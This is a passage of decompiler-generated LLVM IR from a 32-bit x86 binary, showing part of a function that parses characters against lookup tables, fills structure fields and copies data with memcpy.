  %v1_805137e = icmp eq i1 %v5_8051379, false
  %.pre = inttoptr i32 %v0_80513a7.pre.pre to i8*
  br i1 %v1_805137e, label %dec_label_pc_80513a2, label %dec_label_pc_8051384

dec_label_pc_8051384:                             ; preds = %dec_label_pc_8051379
  %v2_8051384 = load i8, i8* %.pre, align 1
  %v11_8051384 = icmp eq i8 %v2_8051384, 46
  %v1_8051387 = icmp eq i1 %v11_8051384, false
  br i1 %v1_8051387, label %dec_label_pc_805139b, label %dec_label_pc_8051389

dec_label_pc_8051389:                             ; preds = %dec_label_pc_8051384
  %v1_8051389 = add i32 %v0_80513a7.pre.pre, 1
  store i32 %v1_8051389, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805126c.outer

dec_label_pc_805139b:                             ; preds = %dec_label_pc_8051384
  br label %dec_label_pc_80513a2

dec_label_pc_80513a2:                             ; preds = %dec_label_pc_8051379, %dec_label_pc_805139b
  %stack_var_-96.2 = phi i32 [ %v0_8051212, %dec_label_pc_805139b ], [ %stack_var_-96.1.ph, %dec_label_pc_8051379 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_805139b ], [ %v0_8051212, %dec_label_pc_8051379 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805b544.223 to i32), i32* @edx, align 4
  %v4_80513a7.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513a7

dec_label_pc_80513a7:                             ; preds = %dec_label_pc_80513b1, %dec_label_pc_80513a2
  %v0_80513b1 = phi i32 [ %v1_80513b1, %dec_label_pc_80513b1 ], [ ptrtoint ([9 x i8]* @global_var_805b544.223 to i32), %dec_label_pc_80513a2 ]
  %v4_80513a7 = phi i32 [ %v6_80513a7, %dec_label_pc_80513b1 ], [ %v4_80513a7.pre, %dec_label_pc_80513a2 ]
  %v2_80513a7 = load i8, i8* %.pre, align 1
  %v3_80513a7 = zext i8 %v2_80513a7 to i32
  %v5_80513a7 = and i32 %v4_80513a7, -256
  %v6_80513a7 = or i32 %v3_80513a7, %v5_80513a7
  store i32 %v6_80513a7, i32* %eax.global-to-local, align 4
  %v3_80513a9 = inttoptr i32 %v0_80513b1 to i8*
  %v4_80513a9 = load i8, i8* %v3_80513a9, align 1
  %v15_80513a9 = icmp eq i8 %v2_80513a7, %v4_80513a9
  br i1 %v15_80513a9, label %dec_label_pc_8051219, label %dec_label_pc_80513b1

dec_label_pc_80513b1:                             ; preds = %dec_label_pc_80513a7
  %v1_80513b1 = add i32 %v0_80513b1, 1
  store i32 %v1_80513b1, i32* @edx, align 4
  %v1_80513b2 = inttoptr i32 %v1_80513b1 to i8*
  %v2_80513b2 = load i8, i8* %v1_80513b2, align 1
  %v3_80513b2 = icmp eq i8 %v2_80513b2, 0
  %v1_80513b5 = icmp eq i1 %v3_80513b2, false
  br i1 %v1_80513b5, label %dec_label_pc_80513a7, label %dec_label_pc_80513b7

dec_label_pc_80513b7:                             ; preds = %dec_label_pc_80513b1, %dec_label_pc_8051219
  %v0_80513ca = phi i32 [ %v1_8051219, %dec_label_pc_8051219 ], [ %v0_80513a7.pre.pre, %dec_label_pc_80513b1 ]
  %v0_80513c7 = phi i32 [ %v0_80513b1, %dec_label_pc_8051219 ], [ %v1_80513b1, %dec_label_pc_80513b1 ]
  %v1_80513b9 = add i32 %v0_80513c7, -134591812
  %v1_80513be = add i32 %v0_80513c7, -134591813
  %v5_80513be = sub i32 134591812, %v0_80513c7
  %v6_80513be = and i32 %v1_80513b9, %v5_80513be
  %v7_80513be = icmp slt i32 %v6_80513be, 0
  %v8_80513be = icmp eq i32 %v1_80513be, 0
  %v9_80513be = icmp slt i32 %v1_80513be, 0
  store i32 %v1_80513be, i32* %eax.global-to-local, align 4
  %v3_80513bf = icmp eq i1 %v9_80513be, %v7_80513be
  %v4_80513bf = icmp eq i1 %v8_80513be, false
  %v5_80513bf = and i1 %v4_80513bf, %v3_80513bf
  br i1 %v5_80513bf, label %dec_label_pc_80513cb, label %dec_label_pc_80513c1

dec_label_pc_80513c1:                             ; preds = %dec_label_pc_80513b7
  %v1_80513c1 = inttoptr i32 %v0_80513ca to i8*
  %v2_80513c1 = load i8, i8* %v1_80513c1, align 1
  %v3_80513c1 = zext i8 %v2_80513c1 to i32
  %v5_80513c1 = and i32 %v1_80513be, -256
  %v6_80513c1 = or i32 %v3_80513c1, %v5_80513c1
  store i32 %v6_80513c1, i32* %eax.global-to-local, align 4
  %v3_80513c3 = inttoptr i32 %v0_80513c7 to i8*
  %v4_80513c3 = load i8, i8* %v3_80513c3, align 1
  %v15_80513c3 = icmp eq i8 %v2_80513c1, %v4_80513c3
  %v1_80513c5 = icmp eq i1 %v15_80513c3, false
  br i1 %v1_80513c5, label %dec_label_pc_80513cb, label %dec_label_pc_80513c7

dec_label_pc_80513c7:                             ; preds = %dec_label_pc_80513c1
  %v1_80513c7 = add i32 %v0_80513c7, 9
  store i32 %v1_80513c7, i32* @edx, align 4
  %v1_80513ca = add i32 %v0_80513ca, 1
  store i32 %v1_80513ca, i32* @esi, align 4
  br label %dec_label_pc_80513cb

dec_label_pc_80513cb:                             ; preds = %dec_label_pc_80513c1, %dec_label_pc_80513b7, %dec_label_pc_80513c7
  %v4_80513d2 = phi i32 [ %v6_80513c1, %dec_label_pc_80513c1 ], [ %v1_80513be, %dec_label_pc_80513b7 ], [ %v6_80513c1, %dec_label_pc_80513c7 ]
  %v0_80513d2 = phi i32 [ %v0_80513ca, %dec_label_pc_80513c1 ], [ %v0_80513ca, %dec_label_pc_80513b7 ], [ %v1_80513ca, %dec_label_pc_80513c7 ]
  %v0_80513cb = phi i32 [ %v0_80513c7, %dec_label_pc_80513c1 ], [ %v0_80513c7, %dec_label_pc_80513b7 ], [ %v1_80513c7, %dec_label_pc_80513c7 ]
  %v1_80513cb = add i32 %v0_80513cb, 9
  %v2_80513cb = inttoptr i32 %v1_80513cb to i8*
  %v3_80513cb = load i8, i8* %v2_80513cb, align 1
  %v4_80513cb = sext i8 %v3_80513cb to i32
  %v2_80513cf = mul nsw i32 %v4_80513cb, 256
  store i32 %v2_80513cf, i32* %ebx.global-to-local, align 4
  %v1_80513d2 = inttoptr i32 %v0_80513d2 to i8*
  %v2_80513d2 = load i8, i8* %v1_80513d2, align 1
  %v3_80513d2 = zext i8 %v2_80513d2 to i32
  %v5_80513d2 = and i32 %v4_80513d2, -256
  %v6_80513d2 = or i32 %v3_80513d2, %v5_80513d2
  store i32 %v6_80513d2, i32* %eax.global-to-local, align 4
  %v4_80513d4 = icmp eq i8 %v2_80513d2, 0
  br i1 %v4_80513d4, label %dec_label_pc_8051588, label %dec_label_pc_80513dc

dec_label_pc_80513dc:                             ; preds = %dec_label_pc_80513cb
  store i32 ptrtoint ([21 x i8]* @global_var_805b581.224 to i32), i32* %ecx.global-to-local, align 4
  %v3_80513e1 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80513e1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80513e5

dec_label_pc_80513e5:                             ; preds = %dec_label_pc_8051434, %dec_label_pc_80513dc
  %v0_8051434 = phi i32 [ %v1_8051434, %dec_label_pc_8051434 ], [ ptrtoint ([21 x i8]* @global_var_805b581.224 to i32), %dec_label_pc_80513dc ]
  %v3_80513e5 = inttoptr i32 %v0_8051434 to i8*
  %v4_80513e5 = load i8, i8* %v3_80513e5, align 1
  %v15_80513e5 = icmp eq i8 %v2_80513d2, %v4_80513e5
  %v1_80513e7 = icmp eq i1 %v15_80513e5, false
  br i1 %v1_80513e7, label %dec_label_pc_8051434, label %dec_label_pc_80513e9

dec_label_pc_80513e9:                             ; preds = %dec_label_pc_80513e5
  %v1_80513eb = add i32 %v0_8051434, -134591873
  store i32 %v1_80513eb, i32* %edx.global-to-local, align 4
  %v7_80513f4 = icmp sgt i32 %v1_80513eb, 17
  br i1 %v7_80513f4, label %dec_label_pc_80513f6, label %dec_label_pc_80513fe

dec_label_pc_80513f6:                             ; preds = %dec_label_pc_80513e9
  %v3_80513f6 = and i32 %v2_80513cf, 1024
  %v4_80513f6 = icmp eq i32 %v3_80513f6, 0
  br i1 %v4_80513f6, label %dec_label_pc_80513fe, label %dec_label_pc_80513fb

dec_label_pc_80513fb:                             ; preds = %dec_label_pc_80513f6
  %v1_80513fb = add i32 %v0_8051434, -134591875
  store i32 %v1_80513fb, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80513fe

dec_label_pc_80513fe:                             ; preds = %dec_label_pc_80513e9, %dec_label_pc_80513f6, %dec_label_pc_80513fb
  %v0_8051407 = phi i32 [ %v1_80513eb, %dec_label_pc_80513e9 ], [ %v1_80513eb, %dec_label_pc_80513f6 ], [ %v1_80513fb, %dec_label_pc_80513fb ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b577.225 to i32), i32* %ecx.global-to-local, align 4
  %v2_8051407 = add i32 %tmp76, 32
  %v3_8051407 = inttoptr i32 %v2_8051407 to i32*
  store i32 %v0_8051407, i32* %v3_8051407, align 4
  %v0_805140a.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805140e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805140a

dec_label_pc_805140a:                             ; preds = %dec_label_pc_805140a, %dec_label_pc_80513fe
  %v0_805140a = phi i32 [ %v1_805140a, %dec_label_pc_805140a ], [ %v0_805140a.pre, %dec_label_pc_80513fe ]
  %v1_805140a = add i32 %v0_805140a, 1
  store i32 %v1_805140a, i32* %ecx.global-to-local, align 4
  %v1_805140b = inttoptr i32 %v1_805140a to i8*
  %v2_805140b = load i8, i8* %v1_805140b, align 1
  %v3_805140b = sext i8 %v2_805140b to i32
  store i32 %v3_805140b, i32* %eax.global-to-local, align 4
  %v8_8051410 = icmp sgt i32 %v0_805140e.pre, %v3_805140b
  br i1 %v8_8051410, label %dec_label_pc_805140a, label %dec_label_pc_8051412

dec_label_pc_8051412:                             ; preds = %dec_label_pc_805140a
  store i32 ptrtoint ([21 x i8]* @global_var_805b581.224 to i32), i32* @ecx, align 4
  %v1_8051419 = add i32 %v0_805140a, -134591863
  store i32 %v1_8051419, i32* %eax.global-to-local, align 4
  %v2_805141e = add i32 %v0_805140a, add (i32 ptrtoint (i32* @global_var_805b568.226 to i32), i32 -134591863)
  %v3_805141e = add i32 %v2_805141e, %v1_8051419
  %v4_805141e = inttoptr i32 %v3_805141e to i16*
  %v5_805141e = load i16, i16* %v4_805141e, align 2
  %v6_805141e = sext i16 %v5_805141e to i32
  store i32 %v6_805141e, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_8051419, 2
  %v3_8051426 = add i32 %factor, 134591832
  %v4_8051426 = inttoptr i32 %v3_8051426 to i16*
  %v5_8051426 = load i16, i16* %v4_8051426, align 2
  %v6_8051426 = sext i16 %v5_8051426 to i32
  store i32 %v6_8051426, i32* %eax.global-to-local, align 4
  %v1_805142e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805142e = or i32 %v1_805142e, %v6_805141e
  %v2_8051430 = and i32 %v2_805142e, %v6_8051426
  store i32 %v2_8051430, i32* %edx.global-to-local, align 4
  %v0_8051442.pre = load i32, i32* @esi, align 4
  %v0_8051445.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805143a

dec_label_pc_8051434:                             ; preds = %dec_label_pc_80513e5
  %v1_8051434 = add i32 %v0_8051434, 1
  store i32 %v1_8051434, i32* @ecx, align 4
  %v1_8051435 = inttoptr i32 %v1_8051434 to i8*
  %v2_8051435 = load i8, i8* %v1_8051435, align 1
  %v3_8051435 = icmp eq i8 %v2_8051435, 0
  %v1_8051438 = icmp eq i1 %v3_8051435, false
  br i1 %v1_8051438, label %dec_label_pc_80513e5, label %dec_label_pc_805143a

dec_label_pc_805143a:                             ; preds = %dec_label_pc_8051434, %dec_label_pc_8051412
  %v0_8051445 = phi i32 [ %v0_8051445.pre, %dec_label_pc_8051412 ], [ %storemerge4, %dec_label_pc_8051434 ]
  %v0_8051442 = phi i32 [ %v0_8051442.pre, %dec_label_pc_8051412 ], [ %v0_80513d2, %dec_label_pc_8051434 ]
  %v0_805143a = phi i32 [ %v2_8051430, %dec_label_pc_8051412 ], [ %v3_80513e1, %dec_label_pc_8051434 ]
  store i32 %v0_805143a, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_8051442 = inttoptr i32 %v0_8051442 to i8*
  %v2_8051442 = load i8, i8* %v1_8051442, align 1
  %v3_8051442 = sext i8 %v2_8051442 to i32
  store i32 %v3_8051442, i32* %eax.global-to-local, align 4
  %v2_8051445 = add i32 %tmp76, 4
  %v3_8051445 = inttoptr i32 %v2_8051445 to i32*
  store i32 %v0_8051445, i32* %v3_8051445, align 4
  %v0_8051448 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051448 = load i32, i32* @edx, align 4
  %v2_8051448 = add i32 %v1_8051448, 12
  %v3_8051448 = inttoptr i32 %v2_8051448 to i32*
  store i32 %v0_8051448, i32* %v3_8051448, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_805144f = load i32, i32* @edx, align 4
  %v1_805144f = add i32 %v0_805144f, 28
  %v2_805144f = inttoptr i32 %v1_805144f to i32*
  store i32 1, i32* %v2_805144f, align 4
  %v0_8051456 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051456 = load i32, i32* @edx, align 4
  %v2_8051456 = add i32 %v1_8051456, 8
  %v3_8051456 = inttoptr i32 %v2_8051456 to i32*
  store i32 %v0_8051456, i32* %v3_8051456, align 4
  %v0_8051459 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051463 = and i32 %v0_8051459, -5
  %v0_8051469 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051469 = and i32 %v0_8051469, 3840
  store i32 %v1_8051469, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_8051472 = or i32 %v1_8051469, %v1_8051463
  store i32 %v2_8051472, i32* @edi, align 4
  %v1_8051474 = load i32, i32* @edx, align 4
  %v2_8051474 = add i32 %v1_8051474, 20
  %v3_8051474 = inttoptr i32 %v2_8051474 to i32*
  store i32 48, i32* %v3_8051474, align 4
  %v0_8051477 = load i32, i32* @edi, align 4
  %v1_8051477 = load i32, i32* @edx, align 4
  %v2_8051477 = add i32 %v1_8051477, 16
  %v3_8051477 = inttoptr i32 %v2_8051477 to i32*
  store i32 %v0_8051477, i32* %v3_8051477, align 4
  %v0_805147a = load i32, i32* @ecx, align 4
  %v1_805147a = inttoptr i32 %v0_805147a to i8*
  %v2_805147a = load i8, i8* %v1_805147a, align 1
  %v3_805147a = icmp eq i8 %v2_805147a, 0
  %v1_805147d = icmp eq i1 %v3_805147a, false
  br i1 %v1_805147d, label %dec_label_pc_8051496, label %dec_label_pc_805147f

dec_label_pc_805147f:                             ; preds = %dec_label_pc_805143a
  %v0_805147f = load i32, i32* @esi, align 4
  %v1_805147f = inttoptr i32 %v0_805147f to i8*
  %v2_805147f = load i8, i8* %v1_805147f, align 1
  %v11_805147f = icmp eq i8 %v2_805147f, 109
  %v1_8051482 = icmp eq i1 %v11_805147f, false
  br i1 %v1_8051482, label %dec_label_pc_8051588, label %dec_label_pc_8051488

dec_label_pc_8051488:                             ; preds = %dec_label_pc_805147f
  %v0_8051488 = load i32, i32* @edx, align 4
  %v1_8051488 = add i32 %v0_8051488, 32
  %v2_8051488 = inttoptr i32 %v1_8051488 to i32*
  store i32 20, i32* %v2_8051488, align 4
  %v0_805148f = load i32, i32* @edx, align 4
  %v1_805148f = add i32 %v0_805148f, 28
  %v2_805148f = inttoptr i32 %v1_805148f to i32*
  store i32 0, i32* %v2_805148f, align 4
  br label %dec_label_pc_8051496

dec_label_pc_8051496:                             ; preds = %dec_label_pc_805143a, %dec_label_pc_8051488
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_805152a, label %dec_label_pc_80514a1

dec_label_pc_80514a1:                             ; preds = %dec_label_pc_8051496
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_80514e2 = add i32 %tmp76, 40
  %v1_805151b = add i32 %tmp76, 28
  %v2_805151b = inttoptr i32 %v1_805151b to i32*
  %v4_80514b0 = add i32 %tmp76, 36
  br label %dec_label_pc_80514a3

dec_label_pc_80514a3:                             ; preds = %dec_label_pc_8051516, %dec_label_pc_80514a1
  %v0_80514b9 = phi i32 [ 0, %dec_label_pc_80514a1 ], [ %v1_805151a, %dec_label_pc_8051516 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_80514a1 ], [ %stack_var_-88.5, %dec_label_pc_8051516 ]
  %v1_80514a3 = add i32 %v0_80514b9, -2
  %v6_80514a3 = sub i32 1, %v0_80514b9
  %v7_80514a3 = and i32 %v6_80514a3, %v0_80514b9
  %v8_80514a3 = icmp slt i32 %v7_80514a3, 0
  %v9_80514a3 = icmp eq i32 %v1_80514a3, 0
  %v10_80514a3 = icmp slt i32 %v1_80514a3, 0
  %v3_80514a6 = icmp eq i1 %v10_80514a3, %v8_80514a3
  %v4_80514a6 = icmp eq i1 %v9_80514a3, false
  %v5_80514a6 = and i1 %v4_80514a6, %v3_80514a6
  br i1 %v5_80514a6, label %dec_label_pc_80514b9, label %dec_label_pc_80514a8

dec_label_pc_80514a8:                             ; preds = %dec_label_pc_80514a3
  store i32 %tmp76, i32* @edx, align 4
  %v0_80514ac = load i32, i32* @esp, align 4
  %v2_80514ac = mul i32 %v0_80514b9, 4
  %v3_80514ac = add i32 %v2_80514ac, 68
  %v4_80514ac = add i32 %v3_80514ac, %v0_80514ac
  %v5_80514ac = inttoptr i32 %v4_80514ac to i32*
  %v6_80514ac = load i32, i32* %v5_80514ac, align 4
  store i32 %v6_80514ac, i32* %eax.global-to-local, align 4
  %v1_80514b0 = trunc i32 %v6_80514ac to i8
  %v5_80514b0 = add i32 %v4_80514b0, %v0_80514b9
  %v6_80514b0 = inttoptr i32 %v5_80514b0 to i8*
  store i8 %v1_80514b0, i8* %v6_80514b0, align 1
  %v0_80514b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80514b4 = urem i32 %v0_80514b4, 256
  br label %dec_label_pc_80514c2

dec_label_pc_80514b9:                             ; preds = %dec_label_pc_80514a3
  %v5_80514bb = add i32 %v0_80514b9, %stack_var_-32.3
  store i32 %v5_80514bb, i32* %eax.global-to-local, align 4
  %v1_80514bf = add i32 %v5_80514bb, -2
  br label %dec_label_pc_80514c2

dec_label_pc_80514c2:                             ; preds = %dec_label_pc_80514a8, %dec_label_pc_80514b9
  %v0_80514d5 = phi i32 [ %v1_80514b4, %dec_label_pc_80514a8 ], [ %v1_80514bf, %dec_label_pc_80514b9 ]
  store i32 %v0_80514d5, i32* %eax.global-to-local, align 4
  %v5_80514c2 = sub i32 %v0_80514d5, %stack_var_-88.4
  %v11_80514c2 = xor i32 %v0_80514d5, %stack_var_-88.4
  %v12_80514c2 = xor i32 %v5_80514c2, %v0_80514d5
  %v13_80514c2 = and i32 %v12_80514c2, %v11_80514c2
  %v14_80514c2 = icmp slt i32 %v13_80514c2, 0
  %v15_80514c2 = icmp eq i32 %v5_80514c2, 0
  %v16_80514c2 = icmp slt i32 %v5_80514c2, 0
  %v3_80514c6 = icmp ne i1 %v16_80514c2, %v14_80514c2
  %v4_80514c6 = or i1 %v15_80514c2, %v3_80514c6
  br i1 %v4_80514c6, label %dec_label_pc_80514d5, label %dec_label_pc_80514c8

dec_label_pc_80514c8:                             ; preds = %dec_label_pc_80514c2
  %v1_80514c8 = add i32 %v0_80514d5, -9
  %v6_80514c8 = sub i32 8, %v0_80514d5
  %v7_80514c8 = and i32 %v6_80514c8, %v0_80514d5
  %v8_80514c8 = icmp slt i32 %v7_80514c8, 0
  %v9_80514c8 = icmp eq i32 %v1_80514c8, 0
  %v10_80514c8 = icmp slt i32 %v1_80514c8, 0
  %v3_80514cb = icmp eq i1 %v10_80514c8, %v8_80514c8
  %v4_80514cb = icmp eq i1 %v9_80514c8, false
  %v5_80514cb = and i1 %v4_80514cb, %v3_80514cb
  br i1 %v5_80514cb, label %dec_label_pc_8051588, label %dec_label_pc_80514d5

dec_label_pc_80514d5:                             ; preds = %dec_label_pc_80514c8, %dec_label_pc_80514c2
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_80514c2 ], [ %v0_80514d5, %dec_label_pc_80514c8 ]
  %v1_80514d5 = add i32 %v0_80514d5, -1
  store i32 %v1_80514d5, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_80514de = load i32, i32* @esp, align 4
  %v1_80514de = load i32, i32* %ebp.global-to-local, align 4
  %v2_80514de = mul i32 %v1_80514de, 4
  %v3_80514de = add i32 %v0_80514de, 80
  %v4_80514de = add i32 %v3_80514de, %v2_80514de
  %v5_80514de = inttoptr i32 %v4_80514de to i32*
  %v6_80514de = load i32, i32* %v5_80514de, align 4
  store i32 %v6_80514de, i32* %edi.global-to-local, align 4
  %v2_80514e2 = mul i32 %v1_80514d5, 4
  %v4_80514e2 = add i32 %v3_80514e2, %v2_80514e2
  %v5_80514e2 = inttoptr i32 %v4_80514e2 to i32*
  %v6_80514e2 = load i32, i32* %v5_80514e2, align 4
  store i32 %v6_80514e2, i32* @eax, align 4
  %v9_80514e6 = icmp eq i32 %v6_80514de, 8
  br i1 %v9_80514e6, label %dec_label_pc_8051516, label %dec_label_pc_80514eb

dec_label_pc_80514eb:                             ; preds = %dec_label_pc_80514d5
  %v9_80514eb = icmp eq i32 %v6_80514e2, 8
  br i1 %v9_80514eb, label %dec_label_pc_8051506, label %dec_label_pc_80514f0

dec_label_pc_80514f0:                             ; preds = %dec_label_pc_80514eb
  %v12_80514f0 = icmp eq i32 %v6_80514e2, %v6_80514de
  br i1 %v12_80514f0, label %dec_label_pc_8051506, label %dec_label_pc_80514f4

dec_label_pc_80514f4:                             ; preds = %dec_label_pc_80514f0
  %v1_80514f4 = call i32 @_promoted_size(i32 %v1_80514d5)
  store i32 %v1_80514f4, i32* %ebx.global-to-local, align 4
  %v0_80514fb = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80514fb, i32* @eax, align 4
  %v1_80514fd = call i32 @_promoted_size(i32 %v1_80514d5)
  store i32 %v1_80514fd, i32* %eax.global-to-local, align 4
  %v8_8051504 = icmp sgt i32 %v1_80514f4, %v1_80514fd
  br i1 %v8_8051504, label %dec_label_pc_8051516, label %dec_label_pc_80514f4.dec_label_pc_8051506_crit_edge

dec_label_pc_80514f4.dec_label_pc_8051506_crit_edge: ; preds = %dec_label_pc_80514f4
  %v0_805150e.pre = load i32, i32* @esp, align 4
  %v1_805150e.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051506

dec_label_pc_8051506:                             ; preds = %dec_label_pc_80514f4.dec_label_pc_8051506_crit_edge, %dec_label_pc_80514f0, %dec_label_pc_80514eb
  %v1_805150e = phi i32 [ %v1_805150e.pre, %dec_label_pc_80514f4.dec_label_pc_8051506_crit_edge ], [ %v1_80514de, %dec_label_pc_80514f0 ], [ %v1_80514de, %dec_label_pc_80514eb ]
  %v0_805150e = phi i32 [ %v0_805150e.pre, %dec_label_pc_80514f4.dec_label_pc_8051506_crit_edge ], [ %v0_80514de, %dec_label_pc_80514f0 ], [ %v0_80514de, %dec_label_pc_80514eb ]
  store i32 %v1_80514d5, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_805150e = mul i32 %v1_805150e, 4
  %v3_805150e = add i32 %v0_805150e, 80
  %v4_805150e = add i32 %v3_805150e, %v2_805150e
  %v5_805150e = inttoptr i32 %v4_805150e to i32*
  %v6_805150e = load i32, i32* %v5_805150e, align 4
  store i32 %v6_805150e, i32* %eax.global-to-local, align 4
  store i32 %v6_805150e, i32* %v5_80514e2, align 4
  br label %dec_label_pc_8051516

dec_label_pc_8051516:                             ; preds = %dec_label_pc_80514f4, %dec_label_pc_80514d5, %dec_label_pc_8051506
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805151a = load i32, i32* %ebp.global-to-local, align 4
  %v1_805151a = add i32 %v0_805151a, 1
  store i32 %v1_805151a, i32* %ebp.global-to-local, align 4
  %v3_805151b = load i32, i32* %v2_805151b, align 4
  %v1_805151e = add i32 %v3_805151b, 2
  store i32 %v1_805151e, i32* %eax.global-to-local, align 4
  %v5_8051523 = icmp slt i32 %v1_805151a, %v1_805151e
  br i1 %v5_8051523, label %dec_label_pc_80514a3, label %dec_label_pc_8051551

dec_label_pc_805152a:                             ; preds = %dec_label_pc_8051496
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805152e = add i32 %tmp76, 38
  %v2_805152e = inttoptr i32 %v1_805152e to i8*
  store i8 1, i8* %v2_805152e, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8051537 = add i32 %tmp76, 28
  %v2_8051537 = inttoptr i32 %v1_8051537 to i32*
  %v3_8051537 = load i32, i32* %v2_8051537, align 4
  %v2_805153a = mul i32 %v3_8051537, 4
  %v2_805153e = ptrtoint i32* %stack_var_-20 to i32
  %v1_8051545 = add i32 %tmp76, 40
  store i32 %v1_8051545, i32* %eax.global-to-local, align 4
  %v3_8051549 = inttoptr i32 %v1_8051545 to i16*
  %v4_8051549 = call i32 @memcpy(i16* %v3_8051549, i32 %v2_805153e, i32 %v2_805153a)
  store i32 %v4_8051549, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051551

dec_label_pc_8051551:                             ; preds = %dec_label_pc_8051516, %dec_label_pc_805152a
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805152a ], [ %stack_var_-88.5, %dec_label_pc_8051516 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_80511fc, align 4
  %v0_805155c = load i32, i32* @ecx, align 4
  %v1_805155c = add i32 %v0_805155c, 16
  %v2_805155c = inttoptr i32 %v1_805155c to i8*
  %v3_805155c = load i8, i8* %v2_805155c, align 1
  %v5_805155c = icmp slt i8 %v3_805155c, 0
  br i1 %v5_805155c, label %dec_label_pc_8051569, label %dec_label_pc_8051562

dec_label_pc_8051562:                             ; preds = %dec_label_pc_8051551
  %v0_8051562 = load i32, i32* @esi, align 4
  %v1_8051562 = add i32 %v0_8051562, 1
  store i32 %v1_8051562, i32* %eax.global-to-local, align 4
  %v2_8051565 = inttoptr i32 %v0_805155c to i32*
  store i32 %v1_8051562, i32* %v2_8051565, align 4
  br label %dec_label_pc_805157c

dec_label_pc_8051569:                             ; preds = %dec_label_pc_8051551
  store i32 %v4_80511d0, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_8051571 = load i32, i32* @esi, align 4
  %v2_8051571 = sub i32 %v0_8051571, %v4_80511d0
  store i32 %v2_8051571, i32* %esi.global-to-local, align 4
  %v1_8051573 = mul i32 %v2_8051571, 4
  %v2_8051573 = add i32 %v1_8051573, 224
  store i32 %v2_8051573, i32* %eax.global-to-local, align 4
  %v2_805157a = load i32, i32* %arg1, align 4
  %v4_805157a = add i32 %v2_805157a, %v2_8051573
  store i32 %v4_805157a, i32* %arg1, align 4
  br label %dec_label_pc_805157c

dec_label_pc_805157c:                             ; preds = %dec_label_pc_8051562, %dec_label_pc_8051569
  store i32 %tmp76, i32* @edx, align 4
  %v1_8051580 = add i32 %tmp76, 28
  %v2_8051580 = inttoptr i32 %v1_8051580 to i32*
  %v3_8051580 = load i32, i32* %v2_8051580, align 4
  store i32 %v3_8051580, i32* %eax.global-to-local, align 4
  %v1_8051583 = add i32 %v3_8051580, 2
  br label %dec_label_pc_805158b

dec_label_pc_8051588:                             ; preds = %dec_label_pc_8051221, %dec_label_pc_80512bb, %dec_label_pc_80512ee, %dec_label_pc_8051369, %dec_label_pc_8051355, %dec_label_pc_805134c, %dec_label_pc_80514c8, %dec_label_pc_805147f, %dec_label_pc_80513cb
  br label %dec_label_pc_805158b

dec_label_pc_805158b:                             ; preds = %dec_label_pc_805157c, %dec_label_pc_8051588
  %storemerge6 = phi i32 [ -1, %dec_label_pc_8051588 ], [ %v1_8051583, %dec_label_pc_805157c ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_805158e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805158e, i32* @ebx, align 4
  store i32 %v0_80511cf, i32* @esi, align 4
  store i32 %v0_80511ce, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_805151a, { 0, 2, 1 }
  uselistorder i32 %v1_80514d5, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_80514c8, { 1, 0 }
  uselistorder i32 %v5_80514c2, { 1, 2, 0 }
  uselistorder i32 %v0_80514d5, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_80514a3, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_80514b9, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_8051434, { 1, 2, 0 }
  uselistorder i32 %v1_805140a, { 1, 2, 0 }
  uselistorder i32 %v0_8051434, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80513cf, { 1, 0 }
  uselistorder i32 %v1_80513be, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_80513c7, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_80513b1, { 0, 2, 3, 1 }
